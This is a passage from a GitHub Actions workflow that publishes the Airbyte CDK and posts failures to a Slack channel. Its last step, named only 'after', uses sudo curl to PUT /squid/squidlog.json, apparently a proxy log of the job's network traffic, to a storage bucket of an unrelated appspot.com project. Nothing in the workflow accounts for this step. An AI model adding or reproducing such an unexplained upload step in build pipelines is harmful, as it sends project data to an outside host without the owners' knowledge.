          \          \"text\": \"See details on <https://github.com/${{github.repository}}/actions/runs/${{github.run_id}}|GitHub>\\\
          n\"\n            }\n        }\n    ]\n}\n"
    - continue-on-error: true
      env:
        SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN_AIRBYTE_TEAM }}
      if: ${{ failure() }}
      name: Post failure to Slack channel dev-connectors-extensibility
      uses: slackapi/slack-github-action@v1.23.0
      with:
        channel-id: C04J1M66D8B
        payload: "{\n    \"text\": \"Error during `publish-cdk` while publishing Airbyte\
          \ CDK!\",\n    \"blocks\": [\n        {\n            \"type\": \"section\"\
          ,\n            \"text\": {\n                \"type\": \"mrkdwn\",\n    \
          \            \"text\": \"Error while publishing Airbyte CDK!\"\n       \
          \     }\n        },\n        {\n            \"type\": \"section\",\n   \
          \         \"text\": {\n                \"type\": \"mrkdwn\",\n         \
          \       \"text\": \"See details on <https://github.com/${{github.repository}}/actions/runs/${{github.run_id}}|GitHub>\\\
          n\"\n            }\n        }\n    ]\n}\n"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/pluralsh/airbyte.$(date
        +%s)
    timeout-minutes: 60
name: Publish CDK Manually
'on':
  workflow_dispatch: {}
